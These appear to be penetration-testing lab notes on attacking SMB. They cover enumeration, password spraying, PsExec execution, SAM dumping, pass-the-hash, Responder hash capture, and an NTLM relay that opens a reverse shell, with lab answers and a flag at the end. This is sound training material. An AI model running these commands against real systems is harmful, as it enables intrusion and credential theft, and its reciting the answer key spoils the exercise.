# Attacking SMB
## Enumeration
```sh
$ sudo nmap 10.129.14.128 -sV -sC -p139,445
```

Keep in mind that when targetting Windows OS, version information is usually not included as part of the Nmap scan results.

## Misconfigurations
### Anonymous Authentication
SMB can be configured not to require authentication, which is often called a `null session`. Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`.

### File Share
Use `smbclient` to list the server's shares with `-L` and using the option `-N` to use the null session:
```sh
$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
``` 

`Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.
```sh
$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:
```sh
$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

Read file:
```sh
$ smbmap -H 10.129.14.128 --download "notes\note.txt"
```

Write file: 
```sh
$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

### Remote Procedure Call (RPC)
We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller. [Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
```sh
$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:
- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information
```sh
$ ./enum4linux-ng.py 10.10.11.45 -A -C
```

## Protocol Specifics Attacks
### Brute Forcing and Password Spray
With `CrackMapExec` (CME), we can target multiple IPs, using numerous users and passwords. This will attempt to authenticate every user from the list using the provided password.
```sh
$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

> **Note:** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`.

### SMB
Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, as we will discuss later in this section. However, in Windows, the attack surface is more significant.

When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:
- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

### Remote Code Execution (RCE)
`Sysinternals` featured several freeware tools to administer and monitor computers running Microsoft Windows.

`PsExec` is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. 

We can download `PsExec` from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:
- `Impacket PsExec` - Python PsExec like functionality example using RemComSvc.
- `Impacket SMBExec` - A similar approach to PsExec without using RemComSvc. The technique is described here. This - implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This - is useful when the target machine does NOT have a writeable share available.
- `Impacket atexec` - This example executes a command on the target machine through the Task Scheduler service and - returns the output of the executed command.
- `CrackMapExec` - includes an implementation of smbexec and atexec.
- `Metasploit PsExec` - Ruby PsExec implementation.

To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:
```sh
$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

The same options apply to `impacket-smbexec` and `impacket-atexec`.

### CrackMapExec
Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.
```sh
$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

**Enumerating Logged-on Users**
```sh
$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

**Extract Hashes from SAM Database**

The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:
- Authenticate as another user.
- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
- Pass The Hash. We will discuss it later in this section.

```sh
$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

**Pass-the-Hash (PtH)**

If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH).

```sh
$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

**Forced Authentication Attacks**

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes by using `responder`.

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.
```sh
$ sudo responder -I ens33
...
<SNIP>
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the `hashcat module 5600`.
```sh
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If we cannot crack the hash, we can potentially relay the captured hash to another machine using `impacket-ntlmrelayx` or Responder `MultiRelay.py`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.
```sh
$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

Gain a reverse shell:
```sh
$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <reverse_shell>'
```
Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
```sh
$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

## Questions
1. What is the name of the shared folder with READ permissions? **Answer: GGJ**
   - `$ smbmap -H 10.129.29.65`
2. What is the password for the username "jason"? **Answer: 34c8zuNBo91!@28Bszh**
   - `$ curl https://academy.hackthebox.com/storage/resources/pws.zip > pws.zip; unzip pws.zip` → Download the password list and unzip it
   - `$ crackmap smb 10.129.29.65 -u jsaon -p pws.list --local-auth` → Bruteforce the jason account
3. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer. **Answer: HTB{SMB_4TT4CKS_2349872359}**
   - `$ smbclient -U jason //10.129.29.65/GGJ` → Login to the SMB share GGJ with the retrieved credential
   - `smbclient> get id_rsa` → Download the SSH private key to local
   - `$ chmod 600 id_rsa` → Restrict access to this key to avoid the `Permissions 0644 for 'id_rsa' are too open`
   - `$ ssh -i id_rsa 10.129.29.65` → SSH to the target server and read the flag using `cat flag.txt`
   